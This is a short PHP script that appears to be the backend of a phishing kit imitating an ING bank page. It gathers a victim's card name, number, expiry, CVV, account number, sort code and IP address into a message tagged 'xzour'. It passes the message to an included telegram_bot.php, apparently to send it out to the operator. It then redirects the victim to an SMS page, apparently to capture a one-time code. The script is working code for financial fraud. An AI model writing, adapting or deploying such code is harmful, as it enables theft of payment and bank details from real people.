<?php

$Xzour = getenv("REMOTE_ADDR");

$message .= "--++-----[ CCCV ]-----++--\n";

$message .= "Full Name Card: ".$_POST['ccname']."\n";
$message .= "Numbr Card: ".$_POST['ccnum']."\n";
$message .= "ExxpirDate: ".$_POST['expiry']."\n";
$message .= "code vccc: ".$_POST['cvv']."\n";
$message .= "account number: ".$_POST['acct']."\n";
$message .= "Sort Code: ".$_POST['sort']."\n";

$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $Xzour\n";
$subject = "Log ING By xzour [ " . $Xzour . " ] ";
include('./telegram_bot.php');


 header("Location: ../SMS.php");

?>

